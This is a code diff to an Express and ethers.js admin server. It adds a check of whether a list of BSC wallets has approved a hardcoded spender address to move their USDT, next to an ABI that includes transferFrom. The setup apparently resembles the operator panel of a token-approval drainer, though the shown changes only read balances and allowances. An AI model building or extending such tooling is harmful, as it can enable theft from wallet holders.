@@ -1,3 +1,4 @@
+
 const express = require("express");
 const path = require("path");
 const dotenv = require("dotenv");
@@ -22,10 +23,12 @@ const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
 const USDT_ABI = [
   "function balanceOf(address) view returns (uint256)",
+  "function allowance(address owner, address spender) view returns (uint256)",
   "function transferFrom(address from, address to, uint amount) returns (bool)"
 ];
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
+const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
 const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
 
 // ✅ Route: Admin Panel on root "/"
@@ -39,9 +42,11 @@ app.get("/wallets", async (req, res) => {
     const walletList = JSON.parse(fs.readFileSync("wallets.json"));
     const result = await Promise.all(walletList.map(async (addr) => {
       const balance = await contract.balanceOf(addr);
+      const allowance = await contract.allowance(addr, SPENDER_ADDRESS);
       return {
         wallet: addr,
-        balance: ethers.utils.formatUnits(balance, 18)
+        balance: ethers.utils.formatUnits(balance, 18),
+        approved: allowance.gt(0) ? "✅ YES" : "❌ NO"
       };
     }));
 
